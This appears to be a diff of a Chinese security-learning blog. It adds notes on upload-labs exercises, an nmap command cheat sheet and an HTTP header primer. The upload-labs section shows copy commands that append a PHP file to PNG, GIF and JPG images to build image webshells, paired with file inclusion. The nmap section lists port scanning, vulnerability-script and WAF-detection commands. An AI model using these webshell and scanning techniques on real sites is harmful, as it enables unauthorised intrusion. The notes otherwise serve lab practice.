+<h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><blockquote>
+<p>通关要求： 上传图片马，要求3种格式(png、jpg、gif)上传成功</p>
+<p>查看源码，观察到读取文件，并只读2字节判断</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less13-1.png" alt></p>
+<blockquote>
+<p> 使用copy 命令，制作图片马，直接上传，配合文件包含漏洞利用</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy 1.png /b + admin.php /a shell.png</span><br><span class="line">copy 1.gif /b + admin.php /a shell.gif</span><br><span class="line">copy 1.jpg /b + admin.php /a shell.jpg</span><br></pre></td></tr></table></figure>
+
+<h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><blockquote>
+<p>观察源码，发现还是判断文件头</p>
+</blockquote>
+<p><img src="D:%5Cnote%5Cweb%E5%AE%89%E5%85%A8%5Cimages%5Cupload-less14-1.png" alt></p>
+<h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://topman.online/2019/07/02/upload-labs/" data-id="cjxluht8u0002ts1yuot58s8l" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-nmap" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/02/nmap/" class="article-date">
+  <time datetime="2019-07-02T13:25:44.070Z" itemprop="datePublished">2019-07-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="目标选择"><a href="#目标选择" class="headerlink" title="目标选择"></a>目标选择</h2><blockquote>
+<p>扫描单IP   nmap 192.168.1.1<br>扫描主机   nmap <a href="http://www.test.com" target="_blank" rel="noopener">www.test.com</a><br>扫描一部分IP nmap  192.168.1.1-20<br>扫描网段   nmap 192.168.1.0/24<br>从文件进行扫描 nmap -iL ip.lst</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以上都是默认扫描，默认扫描1000个tcp端口，会进行主机发现</span><br></pre></td></tr></table></figure>
+
+<h2 id="端口选择"><a href="#端口选择" class="headerlink" title="端口选择"></a>端口选择</h2><blockquote>
+<p>扫描单端口       nmap -p 22  192.168.1.1<br>扫描一部分端口   nmap -p 1-100 192.168.1.1<br>扫描常用端口     nmap -F 192.168.1.1<br>扫描全部端口     nmap -p- 192.168.1.1</p>
+</blockquote>
+<h2 id="扫描类型选项"><a href="#扫描类型选项" class="headerlink" title="扫描类型选项"></a>扫描类型选项</h2><blockquote>
+<p>使用TCP连接扫描   nmap -sT  192.168.1.1<br>使用TCP SYN扫描   nmap -sS  192.168.1.1<br>扫描UDP端口       nmap -sU -p 123,161,162  192.168.1.1<br>不进行主机发现，快速扫描端口  nmap -F -Pn 192.168.1.1</p>
+</blockquote>
+<h2 id="服务和操作系统检测"><a href="#服务和操作系统检测" class="headerlink" title="服务和操作系统检测"></a>服务和操作系统检测</h2><blockquote>
+<p>准检测   nmap -A 192.168.1.1<br>标准服务检测 nmap -sV 192.168.1.1<br>更加积极的服务检测 nmap -sV –version-intensity 9 192.168.1.1<br>更加轻量级的服务检测 nmap -sV –version 0 192.168.1.1</p>
+</blockquote>
+<h2 id="NSE脚本引擎检测"><a href="#NSE脚本引擎检测" class="headerlink" title="NSE脚本引擎检测"></a>NSE脚本引擎检测</h2><blockquote>
+<p>使用默认安全脚本扫描 nmap -sV -sC 192.168.1.1<br>获取脚本帮助  nmap –script-help=ssl-heartbleed<br>使用特定脚本进行扫描 nmap -sV -p 443 –script=ssl-heartbleed 192.168.1.1<br>使用一组脚本进行扫描 nmap -sV –script=smb* 192.168.1.1</p>
+</blockquote>
+<h2 id="waf探测"><a href="#waf探测" class="headerlink" title="waf探测"></a>waf探测</h2><blockquote>
+<p>nmap –script=http-waf-detect 192.168.1.1<br>nmap –script=http-waf-fingerprint 192.168.1.1</p>
+</blockquote>
+<h2 id="结果输出"><a href="#结果输出" class="headerlink" title="结果输出"></a>结果输出</h2><blockquote>
+<p>将默认结果保存到文件   nmap -oN outputfile.txt 192.168.1.1<br>将结果保存为XML       nmap -oX ouputfile.xml 192.168.1.1<br>将结果保存为grep的格式 nmap -oG ouputfile.grep  192.168.1.1<br>保存所有格式           nmap -oA ouputfile  192.168.1.1</p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://topman.online/2019/07/02/nmap/" data-id="cjxluht7w0000ts1y8a8rkijd" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-http" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/02/http/" class="article-date">
+  <time datetime="2019-07-02T13:11:19.294Z" itemprop="datePublished">2019-07-02</time>
 </a>
     
   </div>
@@ -84,7 +423,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/07/02/hello-world/">Hello World</a>
+      <a class="article-title" href="/2019/07/02/http/">http头认识</a>
     </h1>
   
 
@@ -92,24 +431,42 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+        <h2 id="http头认识"><a href="#http头认识" class="headerlink" title="http头认识"></a>http头认识</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: bfe/1.0.8.18</span><br><span class="line">Date: Sun, 24 Mar 2019 15:39:08 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 277</span><br><span class="line">Last-Modified: Mon, 13 Jun 2016 02:50:08 GMT</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">ETag: &quot;575e1f60-115&quot;</span><br><span class="line">Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Accept-Ranges: bytes</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>200            响应状态码<br>Server         服务器名<br>Date           日期/时间<br>Content-Type   文档所属MIME类型<br>Content-Length 请求内容长度<br>Last-Modified  文档最后修改时间<br>Connection     是否需要持续连接<br>ETag           验证令牌，类似于token，类似于服务端与客户端进行匹配的值,缓存验证<br>Cache-Control  缓存控制，控制网页的缓存  private仅允许私有缓存(客户端缓存)，比如说换个浏览器你当前的缓存就没用了，no-cache响应不会被缓存，实时向服务端请求资源，no-store在任何条件下，所有内容都不会被缓存(缓存或者internet临时文件)，并且不会被写入到客户端,proxy-revalidate响应在特定条件会被重用，但是必须到服务端验证，no-transform禁止转码方式(当手机访问时不进行转码，百度会帮助用户进入mobile页面)<br>Pragma         缓存设置，no-cache 响应不会被缓存，实时向服务端请求资源<br>Accept-Ranges  请求实体的范围</p>
+<p>例外<br>host           请求资源的地址<br>Referer        设置后仅允许请求URL的原资源地址，也可以是相对地址<br>User-Agent     用户信息：OS，浏览器信息<br>lcoation       重定向接收者到一个新的URL地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">建议使用http Header Live 火狐插件进行学习理解</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>响应状态码<br>1**   表示信息接收响应，并进行处理<br>2**   表示处理成功响应，表示执行操作被成功接收，执行          200响应成功<br>3**   表示重定向响应，为了完成请求操作，必须进行进一步处理     302重定向<br>4**   表示客户端错误，请求操作含语法错误或者不能被执行         404 请求资源不存在  400 客户端请求语法错误 401 请求未经允许 403 收到请求，但拒绝提供服务<br>5**   表示服务端错误，服务器不能正确处理客户端正确的请求以及请求资源   500 服务器内部错误  503 服务器当前不能正确处理客户端请求，过段时间可能恢复正常。例如ST-052利用时，服务器响应该状态</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http请求方式</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<ol>
+<li>GET       请求指定页面，返回请求实体内容</li>
+<li>POST      请求服务器，POST方式将请求内容放入请求消息体内，GET是放入URL地址中(最大1024字节)</li>
+<li>HEAD      与GET请求一致的响应，仅请求页面首部，相应中包含的元信息与GET响应相同，大部分软件做目录扫描时，使用该请求方式，例如御剑</li>
+<li>PUT       从客户端向服务器传送的数据，可上传内容，比如IISput老兵(上传文件，小马)</li>
+<li>DELETE    请求服务器删除指定资源</li>
+<li>TRACE     请求服务器在响应中的实体主体部分并返回</li>
+<li>CONNET    回显服务器收到的请求</li>
+<li>OPTIONS   使用该方式进行测试服务器针对特定资源所支持的http请求方式，常用于不安全的http请求</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http url</span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<p>定义：统一资源符，包含查找某资源的足够的信息，<a href="http://host[&#39;:&#39;port][path]（域名接管端口）,例如：http://www.cnblogs.com/dadawang/p/10426425.html" target="_blank" rel="noopener">http://host[&#39;:&#39;port][path]（域名接管端口）,例如：http://www.cnblogs.com/dadawang/p/10426425.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网站目录结构</span><br></pre></td></tr></table></figure>
+
+<p>按照功能或作用划分，更好的管理网站，也便于开发者结构化地开发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">静态网站</span><br></pre></td></tr></table></figure>
+
+<p>全部由html页面组成，一般后缀htm,html,shtml等</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">动态网站</span><br></pre></td></tr></table></figure>
+
+<p>一般动态网站使用数据库进行架构，例如数据库内存着访问地址等，一般后缀jsp，asp,aspx,php等</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://topman.online/2019/07/02/hello-world/" data-id="cjxlsgcvn0000w81yqk0m54cf" class="article-share-link">Share</a>
+      <a data-url="http://topman.online/2019/07/02/http/" data-id="cjxlu5a070001wc1yrdj9joru" class="article-share-link">Share</a>
       
       
     </footer>
@@ -150,7 +507,23 @@
       <ul>
         
           <li>
-            <a href="/2019/07/02/hello-world/">Hello World</a>
+            <a href="/2019/07/02/万能密码/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/02/xxe/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/02/xss/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/02/upload-labs/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/02/nmap/">(no title)</a>
           </li>
         
       </ul>
